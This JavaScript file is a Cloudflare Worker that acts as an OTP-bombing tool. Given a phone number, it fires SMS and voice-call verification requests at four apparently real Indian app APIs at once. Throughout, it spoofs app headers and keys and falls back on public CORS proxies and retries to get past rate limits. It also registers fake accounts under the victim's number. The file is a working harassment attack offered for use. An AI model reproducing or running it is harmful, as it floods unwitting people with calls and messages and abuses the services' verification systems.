// ========================
// Helper: random string
// ========================
function randomString(len = 8) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let out = '';
    const buf = new Uint8Array(len);
    crypto.getRandomValues(buf);
    for (let i = 0; i < len; i++) out += chars[buf[i] % chars.length];
    return out;
}

// ========================
// Helper: sleep
// ========================
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ========================
// Helper: real success check
// ========================
function isRealSuccess(data) {
    if (!data || typeof data !== 'object') return false;
    if (data.dry) return false;
    if (data.authorize && data.authorize !== '0') return false;
    if (data.error) return false;
    if (data.message && /frequent|try again|blocked|invalid/i.test(data.message)) return false;
    return true;
}

// ========================
// 1) CashBridge — Multi-strategy (direct + proxies + retries)
// ========================
async function sendCashBridge(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    const targetUrl = 'https://loan.getcashbridge.com/sdkl/vitamin/bottom/react';
    const payload = JSON.stringify({
        govern: clean,
        new: 'register',
        pattern: true,
        disaster: 'cd414c2453dd3ec74e7c879a12e438e0'
    });

    const headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'sec-ch-ua-platform': 'Android',
        'x-version': '1.0.0',
        'x-package-name': 'com.cash.bridge.loan.gg',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        'sec-ch-ua-mobile': '?1',
        'versionnumber': '1.0.0',
        'origin': 'https://loan.getcashbridge.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://loan.getcashbridge.com/login?utm_source=chatgpt.com',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5',
        'priority': 'u=1, i',
        'Cookie': '_gcl_au=1.1.1354668386.1789809534'
    };

    // Attempt 1: Direct
    try {
        const r = await fetch(targetUrl, { method: 'POST', headers, body: payload });
        const text = await r.text();
        let data;
        try { data = JSON.parse(text); } catch { data = text; }
        if (isRealSuccess(data)) return { strategy: 'direct', status: r.status, data };
    } catch (e) { /* proxy fallback */ }

    // Attempt 2: Proxy wrappers
    const proxyWrappers = [
        (url) => `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`,
        (url) => `https://corsproxy.io/?${encodeURIComponent(url)}`,
        (url) => `https://cors.eu.org/${url}`,
        (url) => `https://thingproxy.freeboard.io/fetch/${url}`,
        (url) => `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(url)}`
    ];

    for (let i = 0; i < proxyWrappers.length; i++) {
        try {
            const proxyUrl = proxyWrappers[i](targetUrl);
            const r = await fetch(proxyUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload
            });
            const text = await r.text();
            let data;
            try { data = JSON.parse(text); } catch { data = text; }
            if (isRealSuccess(data)) return { strategy: `proxy-${i + 1}`, status: r.status, data };
            await sleep(500);
        } catch (e) { continue; }
    }

    // Attempt 3: Direct retries with delay
    for (let retry = 0; retry < 3; retry++) {
        await sleep(1000 * (retry + 1));
        try {
            const r = await fetch(targetUrl, { method: 'POST', headers, body: payload });
            const text = await r.text();
            let data;
            try { data = JSON.parse(text); } catch { data = text; }
            if (isRealSuccess(data)) return { strategy: `direct-retry-${retry + 1}`, status: r.status, data };
        } catch (e) { continue; }
    }

    // All failed
    try {
        const r = await fetch(targetUrl, { method: 'POST', headers, body: payload });
        const data = await r.json();
        return { strategy: 'all-failed', status: r.status, data };
    } catch (e) {
        return { strategy: 'all-failed', status: 0, data: { error: e.message } };
    }
}

// ========================
// 2) MatePaisa
// ========================
async function sendMatePaisa(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    return await fetch('https://gaeood-refaces.desisplit.com/nhcxs/qkirtt/gmthhn/rjbwl', {
        method: 'POST',
        headers: {
            'user-agent': 'Dart/3.9 (dart:io)',
            'accept-encoding': 'gzip',
            'csvdklegslngcfietkzyw': 'fdafd5267582605c',
            'content-type': 'application/json',
            'oqvudsrubclnkbxqkqkf': '1',
            'xegotqrowslanqjbqnq': 'MatePaisa',
            'svmdfygmarquc': '941079135e3105516b8bae927b6c21b2',
            'charset': 'utf-8',
            'host': 'gaeood-refaces.desisplit.com',
            'qddvjvvmcpunrdqb': 'com.matepaisa.credit.loantransaction.loantracker',
            'sdvlwapniboft': '',
            'zhfhtdjokwefdamtpcn': 'f7b27fba-3bcc-48ad-9964-6e853374c735',
            'craloswbfujlvad': '1'
        },
        body: JSON.stringify({ bglRycyMysat: clean })
    });
}

// ========================
// 3) Velocity (2-step)
// ========================
async function sendVelocity(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    const headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
        'sec-ch-ua-mobile': '?1',
        'origin': 'https://dashboard.velocity.in',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://dashboard.velocity.in/',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5',
        'priority': 'u=1, i'
    };

    const createRes = await fetch('https://thor.velocity.in/api/v1/users/', {
        method: 'POST',
        headers,
        body: JSON.stringify({
            email: `user${clean}${randomString(8)}@mail.com`,
            full_name: `User ${clean.slice(-4)}`,
            phone: `+91${clean}`,
            password: 'Velocity@123',
            utm_params: '{}',
            preferences: {},
            application_type: null
        })
    });

    const createText = await createRes.text();
    let createData;
    try { createData = JSON.parse(createText); } catch { createData = createText; }

    const otpUuid =
        createData?.otp_uuid ||
        createData?.uuid ||
        createData?.data?.otp_uuid ||
        createData?.data?.uuid ||
        null;

    let otpData = null;
    if (otpUuid) {
        const otpRes = await fetch('https://thor.velocity.in/api/v1/users/resend_otp_call', {
            method: 'POST',
            headers,
            body: JSON.stringify({ otp_uuid: otpUuid })
        });
        const t = await otpRes.text();
        try { otpData = JSON.parse(t); } catch { otpData = t; }
    }

    return {
        createUser: { status: createRes.status, response: createData },
        otp_uuid: otpUuid,
        resendOtp: otpData ? { response: otpData } : { skipped: true, reason: 'no otp_uuid' }
    };
}

// ========================
// 4) Beato (IVR OTP)
// ========================
async function sendBeato(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    return await fetch('https://api.beatoapp.com/v7/onboarding/generateotp', {
        method: 'POST',
        headers: {
            'host': 'api.beatoapp.com',
            'os': 'Android',
            'appname': 'beato',
            'appversion': '4.00.226-380',
            'key': 'ac5eab8c-8914-49bc-931c-c360144205ec',
            'devicemodel': 'Redmi 6Xiaomi9',
            'content-type': 'application/json; charset=utf-8',
            'accept-encoding': 'gzip',
            'user-agent': 'okhttp/5.3.2'
        },
        body: JSON.stringify({
            email: '',
            isdcode: '+91',
            otptype: 'ivr',
            phone: clean,
            resend: true
        })
    });
}

// ========================
// Safe wrapper
// ========================
async function safe(name, fn, phone) {
    try {
        const r = await fn(phone);

        // CashBridge returns { strategy, status, data }
        if (r && r.strategy) {
            return {
                name,
                success: isRealSuccess(r.data),
                strategy: r.strategy,
                status: r.status,
                response: r.data
            };
        }

        // Velocity returns object with createUser
        if (r && r.createUser) {
            return { name, success: true, ...r };
        }

        // Other APIs return Response
        const text = await r.text();
        let data;
        try { data = JSON.parse(text); } catch { data = text; }

        return { name, success: r.status === 200, status: r.status, response: data };
    } catch (e) {
        return { name, success: false, error: e.message };
    }
}

// ========================
// Worker Entry
// ========================
export default {
    async fetch(request) {
        const url = new URL(request.url);
        const mobile = url.searchParams.get('mobile');

        if (!mobile) {
            return new Response(JSON.stringify({ error: 'Missing ?mobile' }), {
                status: 400, headers: { 'Content-Type': 'application/json' }
            });
        }

        const clean = mobile.replace(/\D/g, '');
        if (clean.length !== 10) {
            return new Response(JSON.stringify({ error: 'Mobile must be exactly 10 digits' }), {
                status: 400, headers: { 'Content-Type': 'application/json' }
            });
        }

        // 🔥 4 APIs parallel
        const results = await Promise.all([
            safe('cashbridge', sendCashBridge, clean),
            safe('matepaisa', sendMatePaisa, clean),
            safe('velocity', sendVelocity, clean),
            safe('beato', sendBeato, clean)
        ]);

        const successCount = results.filter(r => r.success).length;

        return new Response(JSON.stringify({
            mobile: clean,
            total: results.length,
            success: successCount,
            failed: results.length - successCount,
            results
        }, null, 2), {
            status: 200, headers: { 'Content-Type': 'application/json' }
        });
    }
};
